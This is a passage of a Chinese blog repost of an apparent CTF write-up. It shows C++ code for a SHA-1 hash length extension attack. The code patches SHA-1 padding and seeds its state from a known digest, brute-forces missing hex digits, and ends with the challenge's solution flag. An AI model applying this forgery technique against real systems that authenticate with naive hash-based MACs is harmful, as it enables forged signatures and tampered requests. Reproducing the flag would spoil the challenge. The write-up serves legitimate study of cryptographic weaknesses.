          context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] = <span class="number">0x80</span>;
        while(context-&amp;gt;<span class="class">Message_Block_Index</span>   &amp;lt; <span class="number">64</span>)
        {
              context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] = <span class="number">0</span>;
          }

        <span class="class">SHA1ProcessMessageBlock</span>(context);

        while(context-&amp;gt;<span class="class">Message_Block_Index</span>   &amp;lt; <span class="number">56</span>)
        {
              context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] = <span class="number">0</span>;
        }
      }
      else
      {
          context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] = <span class="number">0x80</span>;
        while(context-&amp;gt;<span class="class">Message_Block_Index</span>   &amp;lt; <span class="number">56</span>)
        {
              context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] = <span class="number">0</span>;
        }
      }

      /*
     *    &amp;<span class="symbol">#x628A</span>;&amp;<span class="symbol">#x6700</span>;&amp;<span class="symbol">#x540E</span>;<span class="number">64</span>&amp;<span class="symbol">#x4F4D</span>;&amp;<span class="symbol">#x4FDD</span>;&amp;<span class="symbol">#x5B58</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;
     */
         if(isattack)
                   context-&amp;gt;<span class="class">Length_Low</span>   = paddinglength*<span class="number">8</span>;

      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">56</span>] = context-&amp;gt;<span class="class">Length_High</span> &amp;gt;&amp;gt; <span class="number">24</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">57</span>] = context-&amp;gt;<span class="class">Length_High</span> &amp;gt;&amp;gt; <span class="number">16</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">58</span>] = context-&amp;gt;<span class="class">Length_High</span> &amp;gt;&amp;gt; <span class="number">8</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">59</span>] = context-&amp;gt;<span class="class">Length_High</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">60</span>] = context-&amp;gt;<span class="class">Length_Low</span> &amp;gt;&amp;gt; <span class="number">24</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">61</span>] = context-&amp;gt;<span class="class">Length_Low</span> &amp;gt;&amp;gt; <span class="number">16</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">62</span>] = context-&amp;gt;<span class="class">Length_Low</span> &amp;gt;&amp;gt; <span class="number">8</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">63</span>] = context-&amp;gt;<span class="class">Length_Low</span>;

      <span class="class">SHA1ProcessMessageBlock</span>(context);
}

/*
 *    <span class="class">SHA1Reset</span>
 * 
 *  &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x521D</span>;&amp;<span class="symbol">#x59CB</span>;&amp;<span class="symbol">#x5316</span>;&amp;<span class="symbol">#x4E4B</span>;&amp;<span class="symbol">#x64CD</span>;&amp;<span class="symbol">#x4F5C</span>;
 *    <span class="class">Parameters</span>:&amp;<span class="symbol">#xFF08</span>;&amp;<span class="symbol">#x53C2</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x8BBE</span>;&amp;<span class="symbol">#x7F6E</span>;&amp;<span class="symbol">#xFF09</span>;
 *    <span class="method">context:</span> [in/out]
 *  <span class="class">The</span>   context to reset.
 *
 */
int <span class="class">SHA_1</span>::<span class="class">SHA1Reset</span>(<span class="class">SHA1Context</span>   *context, unsigned long h1, unsigned long h2, unsigned long h3,unsigned long   h4,unsigned long h5)
{
      if (!context)
      {
        return shaNull;
      }

      context-&amp;gt;<span class="class">Length_Low</span>               = <span class="number">0</span>;
      context-&amp;gt;<span class="class">Length_High</span>              = <span class="number">0</span>;
      context-&amp;gt;<span class="class">Message_Block_Index</span>      = <span class="number">0</span>;

      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">0</span>]     = h1;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">1</span>]     = h2;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">2</span>]     = h3;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">3</span>]     = h4;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">4</span>]     = h5;

      context-&amp;gt;<span class="class">Computed</span>   = <span class="number">0</span>;
      context-&amp;gt;<span class="class">Corrupted</span>  = <span class="number">0</span>;
      return shaSuccess;
}

/*
 *    <span class="class">SHA1Result</span>
 *
 *  &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;sha-<span class="number">1</span>&amp;<span class="symbol">#x7ED3</span>;&amp;<span class="symbol">#x679C</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#xFF1A</span>;
 *:
 *  &amp;<span class="symbol">#x8BE5</span>;&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x5C06</span>;&amp;<span class="symbol">#x4F1A</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x4E2A</span>;<span class="number">160</span>&amp;<span class="symbol">#x6BD4</span>;&amp;<span class="symbol">#x7279</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6458</span>;&amp;<span class="symbol">#x8981</span>;&amp;<span class="symbol">#x961F</span>;&amp;<span class="symbol">#x5217</span>;
 *
 *  &amp;<span class="symbol">#x6216</span>;&amp;<span class="symbol">#x8005</span>;&amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x51FA</span>;&amp;<span class="symbol">#x8BA1</span>;&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x9519</span>;&amp;<span class="symbol">#x8BEF</span>;
 *
 */
int <span class="class">SHA_1</span>::<span class="class">SHA1Result</span>( <span class="class">SHA1Context</span>   *context,
                unsigned char   <span class="class">Message_Digest</span>[<span class="class">SHA1HashSize</span>])
{
      int i;

      if (!context || !<span class="class">Message_Digest</span>)
      {
        return shaNull;
      }

      if (context-&amp;gt;<span class="class">Corrupted</span>)
      {
        return context-&amp;gt;<span class="class">Corrupted</span>;
      }

      if (!context-&amp;gt;<span class="class">Computed</span>)
      {
        <span class="class">SHA1PadMessage</span>(context);
        for(i=<span class="number">0</span>; i&amp;lt;<span class="number">64</span>; ++i)
        {
            /* &amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6E05</span>;&amp;<span class="symbol">#x96F6</span>; */
            context-&amp;gt;<span class="class">Message_Block</span>[i] = <span class="number">0</span>;
          }
        context-&amp;gt;<span class="class">Length_Low</span> = <span class="number">0</span>;    /* &amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x6E05</span>;&amp;<span class="symbol">#x96F6</span>; */
        context-&amp;gt;<span class="class">Length_High</span> = <span class="number">0</span>;
        context-&amp;gt;<span class="class">Computed</span> = <span class="number">1</span>;
      }

      for(i = <span class="number">0</span>; i &amp;lt; <span class="class">SHA1HashSize</span>; ++i)
      {
        <span class="class">Message_Digest</span>[i] =   context-&amp;gt;<span class="class">Intermediate_Hash</span>[i&amp;gt;&amp;gt;<span class="number">2</span>]
                            &amp;gt;&amp;gt; <span class="number">8</span> * ( <span class="number">3</span> - ( i &amp;amp; <span class="number">0x03</span> ) );
      }

      return shaSuccess;
}

/*
 *  &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;sha-<span class="number">1</span>&amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#xFF1A</span>;
 *
 *  &amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x6536</span>;&amp;<span class="symbol">#x5355</span>;&amp;<span class="symbol">#x4F4D</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;<span class="number">8</span>&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x8282</span>;&amp;<span class="symbol">#x500D</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;
 *
 */
int <span class="class">SHA_1</span>::<span class="class">SHA1Input</span>(    <span class="class">SHA1Context</span>    *context,
                  const unsigned char  *message_array,
                  unsigned       length)
{
      if(isattack)
                   return   shaSuccess;

         if   (!length)
      {
        return shaSuccess;
      }

      if (!context || !message_array)
      {
        return shaNull;
      }

      if (context-&amp;gt;<span class="class">Computed</span>)
      {
        context-&amp;gt;<span class="class">Corrupted</span> =   shaStateError;
          return shaStateError;
      }

      if (context-&amp;gt;<span class="class">Corrupted</span>)
      {
         return context-&amp;gt;<span class="class">Corrupted</span>;
      }
      while(length-- &amp;amp;&amp;amp; !context-&amp;gt;<span class="class">Corrupted</span>)
      {
      context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] =
                    (*message_array &amp;amp;   <span class="number">0xFF</span>);

      context-&amp;gt;<span class="class">Length_Low</span> += <span class="number">8</span>;
      if (context-&amp;gt;<span class="class">Length_Low</span> == <span class="number">0</span>)
      {
        context-&amp;gt;<span class="class">Length_High</span>++;
        if (context-&amp;gt;<span class="class">Length_High</span> == <span class="number">0</span>)
        {
            /* <span class="class">Message</span> is too long */
            context-&amp;gt;<span class="class">Corrupted</span> = <span class="number">1</span>;
        }
      }

      if (context-&amp;gt;<span class="class">Message_Block_Index</span> == <span class="number">64</span>)
      {
        <span class="class">SHA1ProcessMessageBlock</span>(context);
      }

      message_array++;
      }

      return shaSuccess;
}

int main(int argc, char* argv[])
{
         class   <span class="class">SHA_1</span> sha1;
         <span class="class">SHA_1</span>::<span class="class">SHA1Context</span>   sh1context;
//      sha1.<span class="class">SHA1Reset</span>(&amp;amp;sh1context,<span class="number">0x67452301</span>,<span class="number">0xEFCDAB89</span>,<span class="number">0x98BADCFE</span>,<span class="number">0x10325476</span>,<span class="number">0xC3D2E1F0</span>);

         paddinglength   = <span class="number">128</span>;
         isattack   = <span class="class">TRUE</span>;

         char   c[]={&amp;apos;<span class="number">0</span>&amp;apos;,&amp;apos;<span class="number">1</span>&amp;apos;,&amp;apos;<span class="number">2</span>&amp;apos;,&amp;apos;<span class="number">3</span>&amp;apos;,&amp;apos;<span class="number">4</span>&amp;apos;,&amp;apos;<span class="number">5</span>&amp;apos;,&amp;apos;<span class="number">6</span>&amp;apos;,&amp;apos;<span class="number">7</span>&amp;apos;,&amp;apos;<span class="number">8</span>&amp;apos;,&amp;apos;<span class="number">9</span>&amp;apos;,&amp;apos;a&amp;apos;,&amp;apos;b&amp;apos;,&amp;apos;c&amp;apos;,&amp;apos;d&amp;apos;,&amp;apos;e&amp;apos;,&amp;apos;f&amp;apos;};
         int   b[<span class="number">7</span>],b1[<span class="number">7</span>];
         int   bc=<span class="number">0</span>,bc1=<span class="number">0</span>;
         for(int   i=<span class="number">0</span>;i&amp;lt;strlen(argv[<span class="number">1</span>]);i++)
         {
                   if(argv[<span class="number">1</span>][i]   == &amp;apos;x&amp;apos;)
                   {
                            b[bc]   = i;
                            bc++;
                   }
         }

         for(i=<span class="number">0</span>;i&amp;lt;strlen(argv[<span class="number">2</span>]);i++)
         {
                   if(argv[<span class="number">2</span>][i]   == &amp;apos;x&amp;apos;)
                   {
                            b1[bc1]   = i;
                            bc1++;
                   }
         }

         int   i1 = atoi(argv[<span class="number">3</span>]);
//      for(int   i1=<span class="number">7</span>;i1&amp;lt;<span class="number">16</span>;i1++)
         {
                   argv[<span class="number">1</span>][b[<span class="number">0</span>]]   = c[i1];
                   for(int   i2=<span class="number">0</span>;i2&amp;lt;<span class="number">16</span>;i2++)
                   {
                            argv[<span class="number">1</span>][b[<span class="number">1</span>]]   = c[i2];
                            for(int   i3=<span class="number">0</span>;i3&amp;lt;<span class="number">16</span>;i3++)
                            {
                                     printf(&amp;quot;%d   %d %d\n&amp;quot;,i1,i2,i3);
                                     argv[<span class="number">1</span>][b[<span class="number">2</span>]]   = c[i3];
                                     for(int   i4=<span class="number">0</span>;i4&amp;lt;<span class="number">16</span>;i4++)
                                     {
                                               argv[<span class="number">1</span>][b[<span class="number">3</span>]]   = c[i4];
                                               for(int   i5=<span class="number">0</span>;i5&amp;lt;<span class="number">16</span>;i5++)
                                               {
                                                        argv[<span class="number">1</span>][b[<span class="number">4</span>]]   = c[i5];
                                                        for(int   i6=<span class="number">0</span>;i6&amp;lt;<span class="number">16</span>;i6++)
                                                        {
                                                                 argv[<span class="number">1</span>][b[<span class="number">5</span>]]   = c[i6];
                                                                 for(int   i7=<span class="number">0</span>;i7&amp;lt;<span class="number">16</span>;i7++)
                                                                 {
                                                                           argv[<span class="number">1</span>][b[<span class="number">6</span>]]   = c[i7];

                                                                           char   sss[<span class="number">100</span>];
                                                                           char   *tostr;
                                                                           memset(sss,<span class="number">0</span>,sizeof(sss));
                                                                           strcpy(sss,&amp;quot;<span class="number">0</span>x&amp;quot;);
                                                                          memcpy(&amp;amp;sss[<span class="number">2</span>],&amp;amp;argv[<span class="number">1</span>][<span class="number">0</span>],<span class="number">8</span>);
                                                                           unsigned   long h1 = strtoul(sss,&amp;amp;tostr,<span class="number">16</span>);
                                                                           memcpy(&amp;amp;sss[<span class="number">2</span>],&amp;amp;argv[<span class="number">1</span>][<span class="number">8</span>],<span class="number">8</span>);
                                                                           unsigned   long h2 = strtoul(sss,&amp;amp;tostr,<span class="number">16</span>);
                                                                           memcpy(&amp;amp;sss[<span class="number">2</span>],&amp;amp;argv[<span class="number">1</span>][<span class="number">16</span>],<span class="number">8</span>);
                                                                           unsigned   long h3 = strtoul(sss,&amp;amp;tostr,<span class="number">16</span>);
                                                                           memcpy(&amp;amp;sss[<span class="number">2</span>],&amp;amp;argv[<span class="number">1</span>][<span class="number">24</span>],<span class="number">8</span>);
                                                                           unsigned   long h4 = strtoul(sss,&amp;amp;tostr,<span class="number">16</span>);
                                                                           memcpy(&amp;amp;sss[<span class="number">2</span>],&amp;amp;argv[<span class="number">1</span>][<span class="number">32</span>],<span class="number">8</span>);
                                                                           unsigned   long h5 = strtoul(sss,&amp;amp;tostr,<span class="number">16</span>);

                                                                           sha1.<span class="class">SHA1Reset</span>(&amp;amp;sh1context,h1,h2,h3,h4,h5);
                                                                          sha1.<span class="class">SHA1Input</span>(&amp;amp;sh1context,(<span class="class">BYTE</span>*)&amp;quot;attack&amp;quot;,<span class="number">128</span>);
                                                                           <span class="class">BYTE</span>   hashresult[<span class="number">20</span>];
                                                                           sha1.<span class="class">SHA1Result</span>(&amp;amp;sh1context,hashresult);
                                                                           char   stemp[<span class="number">10</span>];
                                                                           char   output[<span class="number">100</span>];
                                                                           output[<span class="number">0</span>]   = <span class="number">0</span>;
                                                                           for(int   i=<span class="number">0</span>;i&amp;lt;<span class="number">20</span>;i++)
                                                                           {
                                                                                    sprintf(stemp,&amp;quot;%<span class="number">02</span>x&amp;quot;,hashresult[i]);
                                                                                    strcat(output,stemp);
                                                                           }
                                                                           for(i=<span class="number">0</span>;i&amp;lt;<span class="number">7</span>;i++)
                                                                                    output[b1[i]]  = &amp;apos;x&amp;apos;;
                                                                           if(strcmp(argv[<span class="number">2</span>],output)   == <span class="number">0</span>)
                                                                           {
                                                                                    printf(&amp;quot;find!   \n%s\n&amp;quot;,argv[<span class="number">1</span>]);
                                                                                    return   <span class="number">0</span>;
                                                                           }
                                                                 }
                                                        }
                                               }
                                     }
                            }
                   }
         }


         return   <span class="number">0</span>;
}
</code></pre><h4 id="&#x6700;&#x540E;&#x83B7;&#x53D6;&#x7684;flag&#x4E3A;Congratulations,_flag_is_flag{ha5h_ex7ens1on_r0cks!}">&#x6700;&#x540E;&#x83B7;&#x53D6;&#x7684;flag&#x4E3A;Congratulations, flag is flag{ha5h_ex7ens1on_r0cks!}</h4><h4 id="*&#x4F5C;&#x8005;&#xFF1A;&#x58A8;&#x5BA2;&#xFF0C;&#x672C;&#x6587;&#x5C5E;FreeBuf&#x539F;&#x521B;&#x5956;&#x52B1;&#x8BA1;&#x5212;&#xFF0C;&#x672A;&#x7ECF;&#x8BB8;&#x53EF;&#x7981;&#x6B62;&#x8F6C;&#x8F7D;">*&#x4F5C;&#x8005;&#xFF1A;&#x58A8;&#x5BA2;&#xFF0C;&#x672C;&#x6587;&#x5C5E;FreeBuf&#x539F;&#x521B;&#x5956;&#x52B1;&#x8BA1;&#x5212;&#xFF0C;&#x672A;&#x7ECF;&#x8BB8;&#x53EF;&#x7981;&#x6B62;&#x8F6C;&#x8F7D;</h4><p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/3UfaIzA">&#x5224;&#x65AD;&#x6B27;&#x62C9;&#x56DE;&#x8DEF;</a></li>
<li>2.<a href="/articles/qqAFRzM">&#x300A;&#x7B97;&#x6CD5;&#x5BFC;&#x8BBA;&#x300B;&#x8BFB;&#x4E66;&#x7B14;&#x8BB0;&#x4E4B;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;&#x2014;Merge Sort &#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;</a></li>
<li>3.<a href="/articles/BnYNRjI">PAT Gas Station</a></li>
<li>4.<a href="/articles/yY7RF3">USACO 2.2 Party Lamps &#x6D3E;&#x5BF9;&#x706F; (lamps)</a></li>
<li>5.<a href="/articles/vuuUFjY">&#x51E0;&#x79CD;&#x9501;&#x7B97;&#x6CD5;&#x7684;&#x5B9E;&#x73B0;</a></li>
<li><p>6.<a href="/articles/NrMJJz">CUDA —— Dynamic Parallelism</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/BRrEJv">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;BRrEJv&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/加密解密/">加密解密</a><a href="/tags/网络安全/">网络安全</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>







  <nav id="page-nav" class="clearfix">
    <a class="extend prev" rel="prev" href="/page/4/"><span></span>Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/6/">Next<span></span></a>
  </nav>

</div>
      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
<aside class="clearfix">

  
<div class="categorieslist">
	<p class="asidetitle">分类</p>
		<ul>
		
		  
			<li><a href="/categories/transcribe/" title="transcribe">transcribe<sup>78</sup></a></li>
		  
		
		  
			<li><a href="/categories/日志/" title="日志">日志<sup>1</sup></a></li>
		  
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">标签</p>
		<ul class="clearfix">
		
			
				<li><a href="/tags/Net/" title=".Net">.Net<sup>7</sup></a></li>
			
		
			
				<li><a href="/tags/JavaScript/" title="JavaScript">JavaScript<sup>5</sup></a></li>
			
		
			
				<li><a href="/tags/数据库/" title="数据库">数据库<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/技术/" title="技术">技术<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/Linux/" title="Linux">Linux<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/iOS开发/" title="iOS开发">iOS开发<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/算法/" title="算法">算法<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/安卓开发/" title="安卓开发">安卓开发<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/链表/" title="链表">链表<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/Oracle数据库/" title="Oracle数据库">Oracle数据库<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/MVC模式/" title="MVC模式">MVC模式<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/Html/" title="Html">Html<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/REST/" title="REST">REST<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/WCF/" title="WCF">WCF<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/Objective-C/" title="Objective-C">Objective-C<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/Docker/" title="Docker">Docker<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/Java/" title="Java">Java<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/性能优化/" title="性能优化">性能优化<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/移动开发/" title="移动开发">移动开发<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/DaoCloud/" title="DaoCloud">DaoCloud<sup>2</sup></a></li>
			
		
		</ul>
</div>


<div class="weiboshow">
	<p class="asidetitle">新浪微博</p>
	<iframe width="100%" height="550" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=550&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=1289635200&verifier=e6bef170&dpc=1"></iframe>
</div>


  <div class="linkslist">
  <p class="asidetitle">友情链接</p>
    <ul>
        
          <li>
            
            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
            
          </li>
        
          <li>
            
            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
            
          </li>
        
    </ul>
</div>

  


  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
</div>

</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> Hello ,I&#39;m Larry Page in Google. <br/>
			This is my blog,believe it or not.</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		<a href="http://weibo.com/512316815" target="_blank" class="icon-weibo" title="微博"></a>
		
		
		<a href="https://github.com/sblig" target="_blank" class="icon-github" title="github"></a>
		
		
		
		
		
		
		
		
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/sblig" target="_blank" title="fblog">fblog</a> © 2015
		
		<a href="/about" target="_blank" title="edwin">edwin</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
        
    }
  });
});
</script>










<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->





<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  </body>
 </html>
